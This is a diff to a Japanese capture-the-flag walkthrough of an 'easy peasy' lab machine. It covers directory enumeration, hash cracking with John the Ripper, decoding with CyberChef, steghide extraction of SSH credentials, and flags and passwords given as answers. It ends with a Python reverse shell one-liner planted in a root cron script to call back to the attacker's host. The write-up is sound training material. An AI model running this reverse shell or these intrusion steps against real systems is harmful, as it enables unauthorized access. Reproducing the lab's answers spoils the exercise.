@@ -73,6 +73,7 @@ gobuster dir -u http://<IP>:65524 -w /usr/share/wordlists/dirb/common.txt -t 100
 ~~~~~~~~
 ```
 ディレクトリは特に見つからないが、`robots.txt`を確認してみる。
+
 Chromeで`http://<IP>:65524/robots.txt`にアクセス。
 
 ```
@@ -85,30 +86,30 @@ User-Agent:a18672860d0510e5ab6699730763b250
 Allow:/
 This Flag Can Enter But Only This Flag No More Exceptions
 ```
-User-Agentの部分が答えかな〜。
-32文字なのでmd5 hashかな。
-サイトによって答えが出てこないのが辛いところ。[ここ](https://md5hashing.net/hash/md5/a18672860d0510e5ab6699730763b250)は出てくる。
+User-Agentの部分が答えかな〜。32文字なのでmd5 hashかな。  
+サイトによって答えが出てこないのが辛いところ。  
+[ここ](https://md5hashing.net/hash/md5/a18672860d0510e5ab6699730763b250)は出てくる。
 
 `flag{1m_s3c0nd_fl4g}`
 
 - 3.Crack the hash with easypeasy.txt, What is the flag 3?  
-`http://<IP>:65524`にアクセスする。
-Apacheのデフォルトページだけど実はそうじゃないらしい。
+`http://<IP>:65524`にアクセスする。  
+Apacheのデフォルトページだけど実はそうじゃないらしい。  
 `view-source:http://<IP>:65524`でソースコードを表示し`flag`で検索をかけるとヒット！
 
 `flag{9fdafbd64c47471a8f54cd3fc64cd312}`
 
 - 4.What is the hidden directory?  
-`view-source:http://<IP>:65524`で`hidden`で検索をかけると、`its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu`なる記述が。
-[Cyberchef](https://gchq.github.io/CyberChef/)で`ba`から始まるdecodeを片っぱしから試してみる。
+`view-source:http://<IP>:65524`で`hidden`で検索をかけると、`its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu`なる記述が。  
+[Cyberchef](https://gchq.github.io/CyberChef/)で`ba`から始まるdecodeを片っぱしから試してみる。  
 `base62`で意味ありげな文字列が出てきたのでこれが答えっぽい。
 
 `/n0th1ng3ls3m4tt3r`
 
 - 5.Using the wordlist that provided to you in this task crack the hash. What is the password?  
-`http://<IP>:65524/n0th1ng3ls3m4tt3r`にアクセスする。
-なんか文字があるので、これをクラックするのか。`940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81`
-ヒントを確認すると、`Gost hash`なるものらしい。
+`http://<IP>:65524/n0th1ng3ls3m4tt3r`にアクセスする。  
+なんか文字があるので、これをクラックするのか。`940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81`  
+ヒントを確認すると、`Gost hash`なるものらしい。  
 `john the ripper`で解読する。ワードリストは与えられた`easypeasy.txt`を使う。
 
 ```
@@ -123,9 +124,9 @@ mypasswordforthatjob (?)
 `mypasswordforthatjob`
 
 - 6.What is the password to login to the machine via SSH?  
-`http://<IP>:65524/n0th1ng3ls3m4tt3r`にあった画像ファイルを調べてみる。  
-(苦戦した〜。binwalkとsteghide,zstagの使い分けを勉強しよう。)
-パスワードは前問の答えを使う。
+`http://<IP>:65524/n0th1ng3ls3m4tt3r`にあった画像ファイルを調べてみる。   
+(苦戦した〜。binwalkとsteghide,zstagの使い分けを勉強しよう。)  
+パスワードは前問の答えを使う。  
 
 ```
 steghide extract -sf binarycodepixabay.jpg -p mypasswordforthatjob
@@ -138,7 +139,7 @@ username:boring
 password:
 01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001
 ```
-passwordの部分はcyberchefでデコード（from binary）する。
+passwordの部分は[Cyberchef](https://gchq.github.io/CyberChef/)でデコード（from binary）する。
 
 `iconvertedmypasswordtobinary`
 
@@ -183,7 +184,7 @@ cat /var/www/.mysecretcronjob.sh
 #!/bin/bash
 # i will run as root
 ```
-ここにrevers shell仕掛ける系だ〜。
+ここにrevers shell仕掛ける系だ〜。  
 python3が使えるみたいなので、以下のコマンドを`.mysecretcronjob.sh`に記述する。
 ```
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LOCAL IP>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
